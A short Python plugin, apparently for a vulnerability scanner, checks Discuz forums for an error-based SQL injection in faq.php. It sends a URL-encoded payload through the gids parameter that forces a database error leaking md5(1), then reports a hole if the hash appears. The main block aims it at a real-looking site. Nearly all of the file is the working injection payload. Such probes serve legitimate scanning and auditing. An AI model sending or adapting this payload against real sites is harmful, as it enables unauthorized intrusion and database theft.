#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Seay'

def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    url = arg
    _, head, body, _, _ = curl.curl(url + '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%281%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23')
    if body and body.find('c4ca4238a0b923820dcc509a6f75849b1') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://www.cnseay.com/')[1])